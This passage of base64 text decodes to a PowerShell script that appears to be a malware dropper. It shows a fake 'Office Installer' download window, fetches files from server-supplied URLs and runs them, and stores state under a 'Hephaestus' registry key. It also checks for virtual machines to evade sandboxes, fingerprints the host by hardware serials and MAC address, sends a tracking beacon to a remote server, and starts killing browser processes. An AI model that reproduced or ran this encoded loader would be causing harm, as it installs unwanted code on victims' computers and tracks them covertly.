kaW5nLi4uIg0KICAgICRzdGF0dXNMYWJlbC5BdXRvU2l6ZSA9ICR0cnVlDQogICAgJHN0YXR1c0xhYmVsLlRvcCA9IDUwDQogICAgJHN0YXR1c0xhYmVsLkxlZnQgPSAyMA0KICAgICRmb3JtLkNvbnRyb2xzLkFkZCgkc3RhdHVzTGFiZWwpDQoNCiAgICAjIENyZWF0ZSBhbmQgY29uZmlndXJlIHRoZSBkZXNjcmlwdGlvbiBsYWJlbA0KICAgICRkZXNjcmlwdGlvbkxhYmVsID0gTmV3LU9iamVjdCBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5MYWJlbA0KICAgICRkZXNjcmlwdGlvbkxhYmVsLlRleHQgPSAiVGhlIGluc3RhbGxlciBpcyBjdXJyZW50bHkgYmVpbmcgZG93bmxvYWRlZC4gUGxlYXNlIHdhaXQgdW50aWwgdGhlIHByb2Nlc3MgY29tcGxldGVzLiINCiAgICAkZGVzY3JpcHRpb25MYWJlbC5BdXRvU2l6ZSA9ICR0cnVlDQogICAgJGRlc2NyaXB0aW9uTGFiZWwuV2lkdGggPSAzNTANCiAgICAkZGVzY3JpcHRpb25MYWJlbC5Ub3AgPSAxMA0KICAgICRkZXNjcmlwdGlvbkxhYmVsLkxlZnQgPSAyMA0KICAgICRmb3JtLkNvbnRyb2xzLkFkZCgkZGVzY3JpcHRpb25MYWJlbCkNCg0KICAgICMgU2hvdyB0aGUgZm9ybSBub24tbW9kYWxseQ0KICAgICRmb3JtLlNob3coKQ0KDQogICAgIyBEZXRlcm1pbmUgdGhlIGZpbGUgbmFtZSBhbmQgcGF0aA0KICAgICRmaWxlTmFtZSA9IEdldC1GaWxlTmFtZUZyb21VcmkgLXVyaSAkdXJsDQogICAgJGZpbGVOYW1lU2F2ZSA9IEFkZC1SYW5kb21EaWdpdHNUb0ZpbGVuYW1lIC1maWxlTmFtZSAkZmlsZU5hbWUNCg0KICAgICR0ZW1wRGlyID0gKFNwbGl0LVBhdGggLVBhdGggJFBTQ29tbWFuZFBhdGgpDQogICAgJGluc3RhbGxlclBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCR0ZW1wRGlyLCAkZmlsZU5hbWVTYXZlKQ0KDQogICAgIyBDcmVhdGUgYW5kIGNvbmZpZ3VyZSB0aGUgV2ViQ2xpZW50DQogICAgJHdlYkNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQNCg0KICAgICMgRGVmaW5lIGV2ZW50IGhhbmRsZXJzDQogICAgJHByb2dyZXNzQ2hhbmdlZEhhbmRsZXIgPSBbU3lzdGVtLk5ldC5Eb3dubG9hZFByb2dyZXNzQ2hhbmdlZEV2ZW50SGFuZGxlcl17DQogICAgICAgIHBhcmFtICgkc2VuZGVyLCAkZXZlbnRBcmdzKQ0KICAgICAgICAkcHJvZ3Jlc3NCYXIuVmFsdWUgPSAkZXZlbnRBcmdzLlByb2dyZXNzUGVyY2VudGFnZQ0KICAgICAgICAkZm9ybS5SZWZyZXNoKCkNCiAgICB9DQoNCiAgICAkZG93bmxvYWRGaWxlQ29tcGxldGVkSGFuZGxlciA9IFtTeXN0ZW0uQ29tcG9uZW50TW9kZWwuQXN5bmNDb21wbGV0ZWRFdmVudEhhbmRsZXJdew0KICAgICAgICBwYXJhbSAoJHNlbmRlciwgJGV2ZW50QXJncykNCiAgICAgICAgIyBDbG9zZSB0aGUgZm9ybSBiZWZvcmUgc3RhcnRpbmcgdGhlIGluc3RhbGxlcg0KICAgICAgICAkZm9ybS5JbnZva2UoW2FjdGlvbl0geyANCiAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BcHBsaWNhdGlvbl06OkRvRXZlbnRzKCkNCiAgICAgICAgICAgICRmb3JtLkNsb3NlKCkgDQogICAgICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuQXBwbGljYXRpb25dOjpEb0V2ZW50cygpDQogICAgICAgIH0pDQogICAgICAgIA0KICAgICAgICBpZiAoJGV2ZW50QXJncy5FcnJvcikgew0KICAgICAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCJFcnJvciBkb3dubG9hZGluZyBmaWxlOiAiICsgJGV2ZW50QXJncy5FcnJvci5NZXNzYWdlLCAiRG93bmxvYWQgRXJyb3IiLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEJ1dHRvbnNdOjpPSywgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hJY29uXTo6RXJyb3IpDQogICAgICAgIH0gZWxzZWlmICgkZXZlbnRBcmdzLkNhbmNlbGxlZCkgew0KICAgICAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCJEb3dubG9hZCBjYW5jZWxsZWQuIiwgIkRvd25sb2FkIENhbmNlbGxlZCIsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94QnV0dG9uc106Ok9LLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEljb25dOjpXYXJuaW5nKQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAjIEV4ZWN1dGUgdGhlIGluc3RhbGxlcg0KICAgICAgICAgICAgICAgIFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRpbnN0YWxsZXJQYXRoIC1XYWl0DQoNCiAgICAgICAgICAgICAgICAjIFdyaXRlIHRvIHRoZSByZWdpc3RyeQ0KICAgICAgICAgICAgICAgICRyZWdpc3RyeVBhdGggPSAiSEtDVTpcU29mdHdhcmVcSGVwaGFlc3R1c1xEb3dubG9hZHMiDQogICAgICAgICAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcmVnaXN0cnlQYXRoKSkgew0KICAgICAgICAgICAgICAgICAgICBOZXctSXRlbSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1Gb3JjZSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ2lzdHJ5UGF0aCAtTmFtZSAkZmlsZU5hbWUgLVZhbHVlICJEb3dubG9hZGVkIg0KICAgICAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCJFcnJvciBleGVjdXRpbmcgdGhlIGluc3RhbGxlcjogIiArICRfLkV4Y2VwdGlvbi5NZXNzYWdlLCAiRXhlY3V0aW9uIEVycm9yIiwgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hCdXR0b25zXTo6T0ssIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94SWNvbl06OkVycm9yKQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BcHBsaWNhdGlvbl06OkRvRXZlbnRzKCkNCiAgICB9DQoNCiAgICAjIEFkZCBldmVudCBoYW5kbGVycyB0byBXZWJDbGllbnQNCiAgICAkd2ViQ2xpZW50LmFkZF9Eb3dubG9hZFByb2dyZXNzQ2hhbmdlZCgkcHJvZ3Jlc3NDaGFuZ2VkSGFuZGxlcikNCiAgICAkd2ViQ2xpZW50LmFkZF9Eb3dubG9hZEZpbGVDb21wbGV0ZWQoJGRvd25sb2FkRmlsZUNvbXBsZXRlZEhhbmRsZXIpDQoNCiAgICB0cnkgew0KICAgICAgICAjIFN0YXJ0IHRoZSBkb3dubG9hZA0KICAgICAgICAkd2ViQ2xpZW50LkRvd25sb2FkRmlsZUFzeW5jKFtVcmldJHVybCwgJGluc3RhbGxlclBhdGgpDQogICAgICAgIA0KICAgICAgICAjIEtlZXAgdGhlIGZvcm0gcmVzcG9uc2l2ZSB3aGlsZSB0aGUgZG93bmxvYWQgaXMgaW4gcHJvZ3Jlc3MNCiAgICAgICAgd2hpbGUgKCRmb3JtLlZpc2libGUpIHsNCiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMQ0KICAgICAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkFwcGxpY2F0aW9uXTo6RG9FdmVudHMoKQ0KICAgICAgICB9DQogICAgfSBjYXRjaCB7DQogICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94XTo6U2hvdygiRXJyb3IgaW5pdGlhdGluZyBkb3dubG9hZDogIiArICRfLkV4Y2VwdGlvbi5NZXNzYWdlLCAiRG93bmxvYWQgRXJyb3IiLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEJ1dHRvbnNdOjpPSywgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hJY29uXTo6RXJyb3IpDQogICAgICAgICRmb3JtLkNsb3NlKCkNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIERvd25sb2FkIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHVybCwNCiAgICAgICAgW3N0cmluZ10kdGl0bGUNCiAgICApDQoNCiAgICAkZmlsZU5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkdXJsKQ0KDQogICAgJGF1dG8gPSBUZXN0LUF1dG9zdGFydDsNCiAgICBpZiAoJHNlcnZlci5zdGFydERvd25sb2Fkc0ZvcmNlIC1uZSAkZmFsc2UgLWFuZCAkYXV0byAtZXEgJHRydWUpDQogICAgew0KICAgICAgICAkcmVnaXN0cnlQYXRoID0gIkhLQ1U6XFNvZnR3YXJlXEhlcGhhZXN0dXNcRG93bmxvYWRzIg0KICAgICAgICBpZiAoVGVzdC1QYXRoICRyZWdpc3RyeVBhdGgpIHsNCiAgICAgICAgICAgICRpbnN0YWxsZWQgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdpc3RyeVBhdGggLU5hbWUgJGZpbGVOYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICBpZiAoJGluc3RhbGxlZCkgDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgd3JpdGVkYmcgIlRoZSBmaWxlICckZmlsZU5hbWUnIGlzIGFscmVhZHkgaW5zdGFsbGVkLiINCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4NCiAgICB9DQoNCiAgICBTdGFydC1Eb3dubG9hZEFuZEV4ZWN1dGUgLXVybCAkdXJsIC10aXRsZSAkdGl0bGUNCn0NCg0KZnVuY3Rpb24gZG9fc3RhcnRkb3dubG9hZHMgew0KICAgIHRyeSANCiAgICB7DQogICAgICAgIGZvcmVhY2ggKCR1cmwgaW4gJHNlcnZlci5zdGFydERvd25sb2FkcykNCiAgICAgICAgew0KICAgICAgICAgICAgRG93bmxvYWQgLXVybCAkdXJsIC10aXRsZSAiRG93bmxvYWRpbmcgT2ZmaWNlIEluc3RhbGxlciINCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICB3cml0ZWRiZyAiQW4gZXJyb3Igb2NjdXJyZWQgKFN0YXJ0IERvd25sb2Fkcyk6ICRfIg0KICAgIH0NCn0NCg0KDQoNCmZ1bmN0aW9uIGRvX3N0YXJ0dXJscyB7DQogICAgJGF1dG8gPSBUZXN0LUF1dG9zdGFydDsNCiAgICBpZiAoJHNlcnZlci5zdGFydFVybHNGb3JjZSAtbmUgJGZhbHNlIC1hbmQgJGF1dG8gLWVxICR0cnVlKQ0KICAgIHsNCiAgICAgICAgd3JpdGVkYmcgIlNraXBwaW5nIGZ1bmN0aW9uIERvU3RhcnRVcmxzIg0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgZm9yZWFjaCAoJHN0YXJ0VXJsIGluICRzZXJ2ZXIuc3RhcnRVcmxzKSB7DQogICAgICAgICAgICBTdGFydC1Qcm9jZXNzICRzdGFydFVybC5UcmltKCkNCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaA0KICAgIHsNCiAgICAgIHdyaXRlZGJnICJBbiBlcnJvciBvY2N1cnJlZCAoU3RhcnQgVXJscyk6ICRfIg0KICAgIH0NCn0NCg0KZnVuY3Rpb24gSXMtVmlydHVhbE1hY2hpbmUgew0KICAgICMgR2V0IFdpbjMyX0NvbXB1dGVyU3lzdGVtIGluZm9ybWF0aW9uDQogICAgJGNvbXB1dGVyU3lzdGVtID0gR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfQ29tcHV0ZXJTeXN0ZW0NCiAgICAkaXNWaXJ0dWFsID0gJGZhbHNlDQoNCiAgICAjIENoZWNrIGZvciBjb21tb24gdmlydHVhbGl6YXRpb24gbWFudWZhY3R1cmVycw0KICAgICR2bU1hbnVmYWN0dXJlcnMgPSBAKA0KICAgICAgICAiTWljcm9zb2Z0IENvcnBvcmF0aW9uIiwgICAjIEh5cGVyLVYNCiAgICAgICAgIlZNd2FyZSwgSW5jLiIsICAgICAgICAgICAgIyBWTXdhcmUNCiAgICAgICAgIlhlbiIsICAgICAgICAgICAgICAgICAgICAgIyBYZW4NCiAgICAgICAgIlhlblNvdXJjZSwgSW5jLiIsICAgICAgICAgIyBYZW5Tb3VyY2UNCiAgICAgICAgImlubm90ZWsgR21iSCIsICAgICAgICAgICAgIyBWaXJ0dWFsQm94DQogICAgICAgICJPcmFjbGUgQ29ycG9yYXRpb24iLCAgICAgICMgVmlydHVhbEJveA0KICAgICAgICAiUGFyYWxsZWxzIFNvZnR3YXJlIEludGVybmF0aW9uYWwgSW5jLiIsICMgUGFyYWxsZWxzDQogICAgICAgICJRRU1VIiwgICAgICAgICAgICAgICAgICAgICMgUUVNVQ0KICAgICAgICAiUmVkIEhhdCwgSW5jLiIsICAgICAgICAgICAjIEtWTQ0KICAgICAgICAiQW1hem9uIEVDMiIsICAgICAgICAgICAgICAjIEFXUyBFQzINCiAgICAgICAgIkdvb2dsZSIsICAgICAgICAgICAgICAgICAgIyBHb29nbGUgQ2xvdWQgUGxhdGZvcm0NCiAgICAgICAgIlZpcnR1b3p6byIsICAgICAgICAgICAgICAgIyBWaXJ0dW96em8NCiAgICAgICAgIkRpZ2l0YWxPY2VhbiIgICAgICAgICAgICAgIyBEaWdpdGFsT2NlYW4NCiAgICApDQoNCiAgICAjIENoZWNrIE1hbnVmYWN0dXJlciBhbmQgTW9kZWwgZm9yIHNpZ25zIG9mIHZpcnR1YWxpemF0aW9uDQogICAgaWYgKCR2bU1hbnVmYWN0dXJlcnMgLWNvbnRhaW5zICRjb21wdXRlclN5c3RlbS5NYW51ZmFjdHVyZXIpIHsNCiAgICAgICAgJGlzVmlydHVhbCA9ICR0cnVlDQogICAgfSBlbHNlaWYgKCRjb21wdXRlclN5c3RlbS5Nb2RlbCAtbWF0Y2ggIlZpcnR1YWx8Vk18VkJPWHxLVk18UUVNVXxQYXJhbGxlbHN8WGVuIikgew0KICAgICAgICAkaXNWaXJ0dWFsID0gJHRydWUNCiAgICB9DQoNCiAgICAjIEFkZGl0aW9uYWwgY2hlY2tzIGZvciB2aXJ0dWFsaXphdGlvbiB1c2luZyBXaW4zMl9CSU9TDQogICAgJGJpb3MgPSBHZXQtV21pT2JqZWN0IC1DbGFzcyBXaW4zMl9CSU9TDQogICAgaWYgKCRiaW9zLlNlcmlhbE51bWJlciAtbWF0Y2ggIlZNd2FyZXxWQk9YfFZpcnR1YWx8WGVufFFFTVV8UGFyYWxsZWxzIikgew0KICAgICAgICAkaXNWaXJ0dWFsID0gJHRydWUNCiAgICB9DQoNCiAgICAjIEFkZGl0aW9uYWwgY2hlY2tzIHVzaW5nIFdpbjMyX0NvbXB1dGVyU3lzdGVtUHJvZHVjdA0KICAgICRjb21wdXRlclN5c3RlbVByb2R1Y3QgPSBHZXQtV21pT2JqZWN0IC1DbGFzcyBXaW4zMl9Db21wdXRlclN5c3RlbVByb2R1Y3QNCiAgICBpZiAoJGNvbXB1dGVyU3lzdGVtUHJvZHVjdC5WZXJzaW9uIC1tYXRjaCAiVmlydHVhbHxWTXxWQk9YfEtWTXxRRU1VfFBhcmFsbGVsc3xYZW4iKSB7DQogICAgICAgICRpc1ZpcnR1YWwgPSAkdHJ1ZQ0KICAgIH0NCg0KICAgICMgQWRkaXRpb25hbCByZWdpc3RyeSBjaGVjayBmb3IgUGFyYWxsZWxzDQogICAgJHBhcmFsbGVsc0tleSA9ICJIS0xNOlxTT0ZUV0FSRVxQYXJhbGxlbHNcUGFyYWxsZWxzIFRvb2xzIg0KICAgIGlmIChUZXN0LVBhdGggJHBhcmFsbGVsc0tleSkgew0KICAgICAgICAkaXNWaXJ0dWFsID0gJHRydWUNCiAgICB9DQoNCiAgICByZXR1cm4gJGlzVmlydHVhbA0KfQ0KDQoNCmZ1bmN0aW9uIEdldC1NYWNoaW5lSGFzaENvZGUgew0KICAgICMgR2V0IEJJT1MgU2VyaWFsIE51bWJlcg0KICAgICRiaW9zU2VyaWFsID0gKEdldC1XbWlPYmplY3QgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyDQoNCiAgICAjIEdldCBNb3RoZXJib2FyZCBTZXJpYWwgTnVtYmVyDQogICAgJG1iU2VyaWFsID0gKEdldC1XbWlPYmplY3QgV2luMzJfQmFzZUJvYXJkKS5TZXJpYWxOdW1iZXINCg0KICAgICMgR2V0IE1BQyBBZGRyZXNzIG9mIHRoZSBmaXJzdCBuZXR3b3JrIGFkYXB0ZXINCiAgICAkbWFjQWRkcmVzcyA9IChHZXQtV21pT2JqZWN0IFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiB8IFdoZXJlLU9iamVjdCB7ICRfLk1BQ0FkZHJlc3MgLWFuZCAkXy5JUEVuYWJsZWQgfSkuTUFDQWRkcmVzc1swXQ0KDQogICAgIyBDb21iaW5lIHRoZSBoYXJkd2FyZSBpZGVudGlmaWVycyBpbnRvIGEgc2luZ2xlIHN0cmluZw0KICAgICRjb21iaW5lZFN0cmluZyA9ICIkYmlvc1NlcmlhbCRtYlNlcmlhbCRtYWNBZGRyZXNzIg0KDQogICAgIyBDb21wdXRlIHRoZSBoYXNoIGNvZGUgdXNpbmcgU0hBMjU2DQogICAgJHNoYTI1NiA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTI1Nl06OkNyZWF0ZSgpDQogICAgJGJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkY29tYmluZWRTdHJpbmcpDQogICAgJGhhc2hCeXRlcyA9ICRzaGEyNTYuQ29tcHV0ZUhhc2goJGJ5dGVzKQ0KICAgICRoYXNoU3RyaW5nID0gW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRoYXNoQnl0ZXMpIC1yZXBsYWNlICItIiwgIiINCg0KICAgIHJldHVybiAkaGFzaFN0cmluZw0KfQ0KDQoNCmZ1bmN0aW9uIEdlbmVyYXRlLUhhc2ggew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZGF0YSwNCiAgICAgICAgW3N0cmluZ10ka2V5DQogICAgKQ0KDQogICAgJGtleUJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygka2V5KQ0KICAgICRkYXRhQnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRkYXRhKQ0KICAgIA0KICAgICRobWFjID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkhNQUNTSEEyNTYNCiAgICAkaG1hYy5LZXkgPSAka2V5Qnl0ZXMNCiAgICAkaGFzaEJ5dGVzID0gJGhtYWMuQ29tcHV0ZUhhc2goJGRhdGFCeXRlcykNCiAgICANCiAgICByZXR1cm4gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkaGFzaEJ5dGVzKQ0KfQ0KDQpmdW5jdGlvbiBXcml0ZS1TdHJpbmdUb0ZpbGUgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kRmlsZU5hbWUsDQogICAgICAgIFtzdHJpbmddJENvbnRlbnQNCiAgICApDQogICAgDQogICAgIyBHZXQgdGhlIHBhdGggdG8gdGhlIGRlc2t0b3ANCiAgICAkRGVza3RvcFBhdGggPSBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnRGVza3RvcCcpDQogICAgDQogICAgIyBDcmVhdGUgdGhlIGZ1bGwgcGF0aCB0byB0aGUgZmlsZQ0KICAgICRGaWxlUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkRGVza3RvcFBhdGggLUNoaWxkUGF0aCAkRmlsZU5hbWUNCiAgICANCiAgICAjIFdyaXRlIHRoZSBjb250ZW50IHRvIHRoZSBmaWxlLCBjcmVhdGluZyBvciBvdmVyd3JpdGluZyBpdA0KICAgIFNldC1Db250ZW50IC1QYXRoICRGaWxlUGF0aCAtVmFsdWUgJENvbnRlbnQNCn0NCg0KZnVuY3Rpb24gR2V0U2VyaWUoKQ0Kew0KICAgICRyZWdpc3RyeVBhdGggPSAiSEtDVTpcU29mdHdhcmVcSGVwaGFlc3R1cyINCiAgICAka2V5TmFtZSA9ICJzZXJpZSINCiAgICAkbmV3VmFsdWUgPSAkc2VydmVyLnRyYWNrU2VyaWUuVG9TdHJpbmcoKTsNCg0KICAgIGlmIChUZXN0LVBhdGggJHJlZ2lzdHJ5UGF0aCkgew0KICAgICAgICAka2V5VmFsdWUgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdpc3RyeVBhdGggLU5hbWUgJGtleU5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSAka2V5TmFtZQ0KICAgICAgICBpZiAoJGtleVZhbHVlIC1hbmQgJGtleVZhbHVlIC1uZSAiIikgew0KICAgICAgICAgICAgcmV0dXJuICRrZXlWYWx1ZQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1OYW1lICRrZXlOYW1lIC1WYWx1ZSAkbmV3VmFsdWUNCiAgICAgICAgICAgIHJldHVybiAkbmV3VmFsdWUNCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgIE5ldy1JdGVtIC1QYXRoICRyZWdpc3RyeVBhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICAgICAgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1OYW1lICRrZXlOYW1lIC1WYWx1ZSAkbmV3VmFsdWUgLVByb3BlcnR5VHlwZSBTdHJpbmcgfCBPdXQtTnVsbA0KICAgICAgICByZXR1cm4gJG5ld1ZhbHVlDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBHZXRUaW1lRGlmKCkNCnsNCiAgICAkcmVnaXN0cnlQYXRoID0gIkhLQ1U6XFNvZnR3YXJlXEhlcGhhZXN0dXMiDQogICAgJGtleU5hbWUgPSAidGltZURpZiINCiAgICAkdGltZURpZj0wOw0KDQogICAgaWYgKFRlc3QtUGF0aCAkcmVnaXN0cnlQYXRoKSB7DQogICAgICAgICRrZXlWYWx1ZSA9IEdldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ2lzdHJ5UGF0aCAtTmFtZSAka2V5TmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5ICRrZXlOYW1lDQogICAgICAgIGlmICgka2V5VmFsdWUgLWFuZCAka2V5VmFsdWUgLW5lICIiKSB7DQogICAgICAgICAgICAkdGltZURpZiA9ICRrZXlWYWx1ZQ0KICAgICAgICB9DQogICAgfQ0KICAgIGlmICgkdGltZURpZiAtYXMgW2ludF0pIHsNCiAgICAgICAgJHRpbWVEaWYgPSBbaW50XSR0aW1lRGlmDQogICAgfSBlbHNlIHsNCiAgICAgICAgJHRpbWVEaWY9IDANCiAgICB9DQogICAgcmV0dXJuICR0aW1lRGlmDQp9DQoNCmZ1bmN0aW9uIGRvX3RyYWNrZXIgew0KICAgIGlmICgkc2VydmVyLnRyYWNrIC1lcSAkZmFsc2Upew0KICAgICAgICByZXR1cm4NCiAgICB9DQoNCiAgICAkaXNWTSA9IElzLVZpcnR1YWxNYWNoaW5lDQogICAgaWYgKCRpc1ZNIC1lcSAkdHJ1ZSl7DQogICAgICAgIHJldHVybg0KICAgIH0NCg0KICAgICRlbGV2YXRlZCA9IDANCiAgICBpZiAoSXNFbGV2YXRlZCkNCiAgICB7DQogICAgICAgICRlbGV2YXRlZD0xOw0KICAgIH0NCg0KICAgICRpZCA9IEdldC1NYWNoaW5lSGFzaENvZGUNCg0KICAgICRib2R5ID0gIntgImlkYCI6YCIkKCRpZC5Ub1N0cmluZygpKWAiLGAic2VyaWVgIjpgIiQoR2V0U2VyaWUpYCIsYCJudW1iZXJgIjpgIiQoJGlkLlRvU3RyaW5nKCkpYCIsYCJlbGV2YXRlZF9udW1iZXJgIjokKCRlbGV2YXRlZCksYCJ0aW1lRGlmYCI6JChHZXRUaW1lRGlmKX0iDQoNCg0KICAgICMgU2VjcmV0IGtleSAoc2hhcmVkIHdpdGggdGhlIHNlcnZlcikNCiAgICAkc2VjcmV0S2V5ID0gIllvdXJTZWNyZXRLZXlIZXJlIg0KDQogICAgJHVybD0gJHNlcnZlci50cmFja1VybA0KICANCiAgICAjIEdlbmVyYXRlIHRoZSBoYXNoIGZvciB0aGUgSlNPTiByZXF1ZXN0IGJvZHkNCiAgICAkaGFzaCA9IEdlbmVyYXRlLUhhc2ggLWRhdGEgJGJvZHkgLWtleSAkc2VjcmV0S2V5DQoNCiAgICAjIFByZXBhcmUgaGVhZGVycw0KICAgICRoZWFkZXJzID0gQHsNCiAgICAgICAgIlgtU2lnbmF0dXJlIiA9ICRoYXNoDQogICAgICAgICJDb250ZW50LVR5cGUiID0gImFwcGxpY2F0aW9uL2pzb24iDQogICAgICAgICJVc2VyLUFnZW50IiAgPSAiUG93ZXJTaGVsbC83LjIiICAjIFVzZSB0aGUgVXNlci1BZ2VudCBmcm9tIFBvc3RtYW4gaWYga25vd24NCiAgICB9DQoNCiAgICAkdGltZW91dCA9IFtkYXRldGltZV06OlV0Y05vdy5BZGRNaW51dGVzKDEpDQogICAgJGRlbGF5ID0gNQ0KDQogICAgDQogICAgd2hpbGUgKFtkYXRldGltZV06OlV0Y05vdyAtbHQgJHRpbWVvdXQpIA0KICAgIHsNCiAgICAgDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgSW52b2tlLVdlYlJlcXVlc3QgLUhlYWRlcnMgJGhlYWRlcnMgLU1ldGhvZCAiUE9TVCIgLUJvZHkgJGJvZHkgLVVyaSAkdXJsIC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCINCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIFtTeXN0ZW0uTmV0LldlYkV4Y2VwdGlvbl0gew0KICAgICAgICAgICAgICAgICRzdGF0dXNDb2RlID0gJF8uRXhjZXB0aW9uLlJlc3BvbnNlLlN0YXR1c0NvZGUNCiAgICAgICAgICAgICAgICAkcmVzcFN0cmVhbSA9ICRfLkV4Y2VwdGlvbi5SZXNwb25zZS5HZXRSZXNwb25zZVN0cmVhbSgpDQogICAgICAgICAgICAgICAgJHJlYWRlciA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVJlYWRlcigkcmVzcFN0cmVhbSkNCiAgICAgICAgICAgICAgICAkcmVhZGVyLkJhc2VTdHJlYW0uUG9zaXRpb24gPSAwDQogICAgICAgICAgICAgICAgJHJlc3BvbnNlQm9keSA9ICRyZWFkZXIuUmVhZFRvRW5kKCkgfCBDb252ZXJ0RnJvbS1Kc29uDQogICAgICAgICAgICAgICAgICAgIHdyaXRlZGJnICJFcnJvciBtYWtpbmcgcmVxdWVzdDogJHJlc3BvbnNlQm9keSINCiAgICAgICAgICAgIA0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2h7DQogICAgICAgICAgICAgICAgICAgIHdyaXRlZGJnICJFcnJvciBtYWtpbmcgcmVxdWVzdDogJF8iDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRkZWxheQ0KICAgIH0NCg0KICAgIGlmICgkc2VydmVyLnRyYWNrRGVza3RvcCAtZXEgJHRydWUpew0KICAgICAgICBXcml0ZS1TdHJpbmdUb0ZpbGUgLUZpbGVOYW1lICIkKCRzZXJ2ZXIudHJhY2tTZXJpZSkudHh0IiAtQ29udGVudCAkaWQNCiAgICB9DQoNCn0NCg0KZnVuY3Rpb24gZG9feWFuZGV4DQp7DQogICAgQ2xvc2UtUHJvY2Vzc2VzKEAoJ3NlcnZpY2VfdXBkYXRlLmV4ZScsJ2Jyb3dzZXIuZXhlJykpDQoNCiAgICBmb3JlYW